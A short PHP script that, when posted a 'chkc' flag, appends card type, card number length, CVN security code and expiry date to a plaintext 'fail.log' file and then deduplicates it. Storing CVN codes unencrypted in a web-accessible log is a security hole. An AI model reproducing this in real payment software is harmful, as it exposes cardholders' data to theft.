<?php 
if(!isset($_POST["chkc"])) {
	exit();	
}
/* leng:p,type:o,year:i,mnth:u,cvn:y */
if(isset($_POST["leng"]) && isset($_POST["type"]) && isset($_POST["year"]) && isset($_POST["mnth"]) && isset($_POST["cvn"])) {
	$filename = 'fail.log';
	
	$file = fopen ($filename,"a+");
	$str = date('c')."\tCC Type: ".(!empty($_POST["type"])?$_POST["type"]:"-").
	"\tCC length: ".(!empty($_POST["leng"])?$_POST["leng"]:"-").
	"\tCC CVN: ".(!empty($_POST["cvn"])?$_POST["cvn"]:"-").
	"\tExp month: ".(!empty($_POST["mnth"])?$_POST["mnth"]:"-").
	"\tExp year: ".(!empty($_POST["year"])?$_POST["year"]:"-")."\n";
	fputs ( $file, $str);
	fclose ($file);
	
	$text = array_unique(file($filename));
	$f = @fopen($filename,'w+');
	if ($f) {
		fputs($f, join('',$text));
		fclose($f);
	}
} else {
	exit();
}